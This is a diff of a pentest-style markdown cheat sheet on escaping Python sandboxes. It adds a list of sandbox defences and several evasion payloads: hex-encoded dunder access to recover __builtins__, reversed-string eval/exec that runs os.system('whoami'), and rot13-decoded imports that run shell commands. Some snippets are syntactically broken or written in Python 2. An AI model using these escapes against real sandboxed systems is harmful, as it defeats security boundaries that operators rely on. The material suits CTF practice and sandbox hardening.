@@ -1,6 +1,40 @@
+---
+description: >-
+  All internal quotes would be single quotes and all outer quotes will be double
+  quotes
+---
+
 # Bypass Python Sandbox
 
-## Bypass forbidden characters
+## string quotes
+
+```text
+str = ''' This is a string'''
+str = 'This is a string'
+str = "This is a string"
+
+Multiline_Nested_str = '''
+This is a string1 'This is string2'
+This is another string1
+'''
+
+compressed_above_str = "\nThis is a string1 '\nThis is another string1\n"
+
+Nested_str = "This is string1 and 'This is string2 and \' This is string3 \''"
+Nested_str = " This is string0 'string1 \" and string2 \' and string3 \' \" and another string1' and another string0"
+
+```
+
+## Defenses in a python sandbox
+
+1. Forbidden characters or input validation
+2. No builtins
+   * `exec('cmd', {'__builtins__': None})`
+3. Restricted system modules 
+   * `sys.modules['os'] = 'not allowed'`
+   * Skip execution if os shell modules are executed.
+
+## 1. Bypass - Forbidden characters or input validation
 
 * We can encode forbidden characters in their encoded form. Here we used hex encoded as it works smoothly as compared to octal encoding.
 * Target command
@@ -8,7 +42,25 @@
 * Updated command, after converting payload to hex bypte code
   * `exec("\x5bi for i in \x28)\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbases\x5f\x5f\x5b0]\x2e\x5f\x5fsubclasses\x5f\x5f\x28) if i\x2e\x5f\x5fname\x5f\x5f=='catch\x5fwarnings']\x5b0]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f")`
 
-## Alternative.to commands
+### Transform string
+
+* You also play with transforming the string to escape harcoded input validation
+  * Example, if validation check if `import os` is present or not. 
+* Evasion1 : string concat at runtime after validation
+  *  `a='o'\nb='s'\nimport a+b \n os.system('whoami')`
+* Evasion2 : reversing the string 
+  * `import('so'[::-1]).system('whoami')`
+  * `eval(')"whoami"(metsys.)"so"(__tropmi__'[::-1])`
+  * `exec(')"imaohw"(metsys.so ;so tropmi'[::-1])`
+* Evasion3 : encoding and 'decoding at runtime'
+  * Command to execute
+    * `f3ck = __import__ commands` 
+    * `print commands.getoutput("ls")` 
+  * Evasion3 command
+    * `f3ck = __import__("pbzznaqf".decode('rot_13'))` 
+    * `print f3ck.getoutput('ifconfig')`
+* * 
+## Restricted system modules 
 
 * You can perform a task in multiple ways, below is a list of all different ways used to perform the same action.
 * [https://www.python-course.eu/os\_module\_shell.php](https://www.python-course.eu/os_module_shell.php)
